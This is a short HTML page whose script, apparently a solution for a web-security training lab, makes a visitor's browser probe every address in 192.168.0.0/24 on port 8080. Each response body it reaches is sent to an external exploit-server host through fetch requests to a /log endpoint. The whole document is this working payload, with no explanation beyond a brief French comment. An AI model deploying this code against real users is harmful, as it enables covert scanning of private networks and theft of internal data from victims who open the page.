<html>
	<script>
		url='https://exploit-0a66002d04da97a380a399b701e00009.exploit-server.net/'
		
        for (let i=0;i<256;i++) 
		{ // boucle qui test toutes les adresses en masque 24			
			fetch('http://192.168.0.' + i + ':8080').then(response => response.text()).then(text => {
				try {
					fetch(url+'/log?key='+'http://192.168.0.'+i+ "&code="+encodeURIComponent(text))
				}
				catch(err)
				{
				}		
			})
	
		}
	</script>
</html>